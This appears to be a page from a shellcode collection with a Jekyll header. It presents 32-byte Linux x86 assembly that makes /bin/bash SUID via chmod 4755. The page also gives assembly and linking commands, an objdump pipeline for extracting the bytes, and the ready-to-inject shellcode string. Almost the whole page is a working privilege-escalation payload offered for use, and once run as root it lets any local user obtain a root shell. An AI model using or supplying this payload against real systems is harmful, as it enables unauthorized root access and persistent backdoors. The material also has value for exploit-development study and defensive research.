---
layout: default
title: chmod("/bin/bash", 4755) - Make bash SUID
permalink: /shellcode/asm-03.html
os: Linux
arch: Intel x86
length: 32
---

# {{ page.title }}

---
**OS:** {{ page.os }}

**Architecture:** {{ page.arch }}

**Length:** {{ page.length }} bytes

---

## Assembly

```nasm
section .text
global _start

_start:
	xor eax, eax			; null eax (0)

	push eax			; push null terminator
	mov al, 0x68			; move "h" into al (eax)
	push eax			; push "h"

	push dword 0x7361622f		; push "/bas"
	push dword 0x6e69622f		; push "/bin"

	mov ebx, esp			; move pointer to "/bin/bash" into ebx
	mov cx, 4755o			; move mode (4000: SUID, 755: rwxr-xr-x) into cx (ecx)

	mov al, 0x0f			; move chmod syscall number into al (eax)
	int 0x80			; call chmod

	xor ebx, ebx			; null ebx (0)
	mov al, 0x1			; move exit syscall number into al (eax)
	int 0x80			; call exit
```

## Compilation and Linking

```bash
# Assemble
nasm -f elf -o code.o code.asm

# Link
ld -m elf_i386 -o code code.o

# Extract Shellcode
printf '\\x' && objdump -d code | grep "^ " | cut -f2 | tr -d ' ' | tr -d '\n' | sed 's/.\{2\}/&\\x /g'| head -c-3 | tr -d ' ' && echo ' '
```

## Shellcode

```
\x31\xc0\x50\xb0\x68\x50\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x66\xb9\xed\x09\xb0\x0f\xcd\x80\x31\xdb\xb0\x01\xcd\x80
```